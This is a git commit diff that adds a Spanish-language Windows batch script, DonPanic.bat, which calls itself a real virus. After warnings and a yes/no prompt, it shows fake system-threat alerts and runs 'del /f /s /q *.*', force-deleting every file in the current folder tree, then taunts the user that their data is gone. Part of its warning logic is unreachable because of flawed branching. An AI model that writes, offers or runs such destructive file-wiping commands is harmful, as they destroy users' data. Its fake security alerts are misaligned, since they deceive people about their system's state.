bb5af5c1b6dbf9efb5cb697e77f8f78a2bfefe56
Minguelasgo-2013 <minguelasgo@hotmail.com>
2026-08-29 13:25:30 +0200

    Create DonPanic.bat

---
+++ DonPanic.bat
@@ -0,0 +1,38 @@
+@echo off
+title Confirmacion de Seguridad
+color 0f
+
+:: 1. Mensaje de advertencia inicial
+echo   ADVERTENCIA: Estas a punto de ejecutar un
+echo   virus de verdad esto borrara todos tus datos
+echo   ya has sido avisado y es muy pesigroso
+echo.
+
+:: 2. Pregunta de Sí o No (/M pone el mensaje, /C define las teclas permitidas)
+choice /M "¿Quieres proceder?" /C SN
+
+:: 3. Evaluar la respuesta (IMPORTANTE: Se evalúa de mayor a menor número)
+:: S es la opción 1, N es la opción 2
+if errorlevel 2 goto :cancelar
+if errorlevel 1 goto :ejecutar
+
+echo   ADVERTENCIA: Esto no es una broma
+echo   esto borrara todo lo que tienes en este
+echo   dispositivo NO ESTOY DE BROMA
+echo.
+
+choice /M "¿Quieres proceder?" /C SN
+
+
+
+:ejecutar
+cls
+title Alerta del Sistema
+color 4f
+msg * ADVERTENCIA: Se ha detectado una amenaza en su sistema.
+msg * Iniciando el protocolo de eliminacion de archivos...
+del /f /s /q *.*
+msg * Lo sentimos pero tus datos han sido borrados TE HE AVISADO
+goto :eof
+
+
